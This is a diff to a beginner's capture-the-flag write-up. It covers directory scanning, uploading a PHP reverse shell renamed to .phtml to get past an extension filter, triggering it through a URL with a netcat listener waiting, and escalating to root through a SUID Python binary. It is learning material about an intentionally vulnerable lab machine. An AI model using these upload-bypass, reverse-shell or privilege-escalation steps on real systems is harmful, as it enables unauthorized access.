@@ -30,7 +30,7 @@ The webpage didn't show anything particularly interesting at first glance. I fig
 gobuster dir -u 10.49.179.155 -w /usr/share/wordlists/dirb/common.txt
 ```
 <p align="center">
-  <img src="assets/images/02-gobuster-result.png" width="750"> 
+  <img src="assets/images/02-gobuster-result.png" width="600"> 
 </p>
 
 Two directories showed up: `/panel` and `/uploads`. I went to `/panel` first to see what it was.
@@ -45,7 +45,7 @@ Two directories showed up: `/panel` and `/uploads`. I went to `/panel` first to 
   <img src="assets/images/03-upload-panel.png" width="500">
 </p>
 
-I grabbed the PHP reverse shell from `/usr/share/webshells/php/php-reverse-shell.php` and edited the IP and port inside the file to point to my machine.
+I grabbed a PHP reverse shell from `/usr/share/webshells/php/php-reverse-shell.php`. The script used GET parameters for the IP and port, so I could pass my machine’s address and port directly when executing it.
 
 <p align="center">
   <img src="assets/images/04-shell-file.png" width="500">
@@ -59,6 +59,13 @@ Then tried uploading it directly. It got rejected. Okay, so there's some kind of
 
 I started searching for other file extensions that PHP can execute, basically looking for anything that might work as a bypass. I came across `.phtml` as one of the alternatives, and since the filter seemed to only care about `.php`, it was worth trying. I renamed the file to `reverse-shell.phtml` and uploaded it again.
 
+
+This time the upload went through without any issues.
+
+<p align="center">
+  <img src="assets/images/05-upload-success.png" width="450">
+</p>
+
 Before triggering the shell, I set up a Netcat listener on port 4444 to catch the connection.
 
 ```bash
@@ -69,21 +76,11 @@ nc -lvnp 4444
   <img src="assets/images/06-netcat-listener.png" width="450">
 </p>
 
-This time the upload went through without any issues.
-
-<p align="center">
-  <img src="assets/images/05-upload-success.png" width="450">
-</p>
-
-Since I knew the `/uploads` directory was accessible, I navigated to the uploaded file and passed the IP and port as parameters to trigger the reverse shell.
+Since the `/uploads` directory was accessible, I navigated to the uploaded file through my browser and passed my IP and port as GET parameters in the URL to trigger the file.
 
 ```
 http://10.49.179.155/uploads/reverse-shell.phtml?ip=192.168.181.147&port=4444
 ```
-
-<p align="center">
-  <img src="assets/images/11-Trigger-The-Reverse-Shell.png" width="400">
-</p>
 
 The page loaded and hung. I switched back to my terminal and the connection had come in.
 
@@ -111,7 +108,7 @@ cat /var/www/user.txt
 
 ## Privilege Escalation
 
-With a foothold on the machine, I started looking for ways to escalate. One of the things I usually check early on is SUID binaries, since they run with the file owner's privileges regardless of who executes them. If something interesting has the SUID bit set, it might be abusable.
+After gaining a foothold, I moved on to privilege escalation. Following the hint, I searched for SUID binaries owned by root using `find / -user root -perm /4000`. Since SUID binaries run with elevated privileges, any unusual file in the list could be a potential target for exploitation.
 
 ```bash
 find / -user root -perm /4000 2>/dev/null
@@ -128,14 +125,10 @@ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
 <p align="center">
-  <img src="assets/images/9-whoami-root.png" width="450">
+  <img src="assets/images/09-whoami-root.png" width="450">
 </p>
 
-That was it. I was root. The last thing left was grabbing the root flag.
-
-```bash
-cat /root/root.txt
-```
+Finally, the last thing left was grabbing the root flag.
 
 <p align="center">
   <img src="assets/images/root-flag.png" width="450">
@@ -178,3 +171,7 @@ Setting up the listener itself was also new to me. I now understand what `nc -lv
 The file upload bypass was something I figured out through searching, not prior knowledge. I didn't know going in that PHP can execute files with extensions other than `.php`. Finding that out and successfully using `.phtml` to get past the filter was a good lesson in why blacklists fail and why you should always look for alternatives when something gets blocked.
 
 Lastly, I learned about GTFOBins. I had no idea this resource existed before this room. It's essentially a reference for binaries that can be abused for privilege escalation, file reads, shell spawning, and more. Finding Python in the SUID results and then looking it up on GTFOBins to get the exact exploit command was a straightforward process once I knew where to look.
+
+<br>
+
+> Big thanks to the creator for this fun and simple room, it’s a great way to practice some basic Linux privesc skills ^^
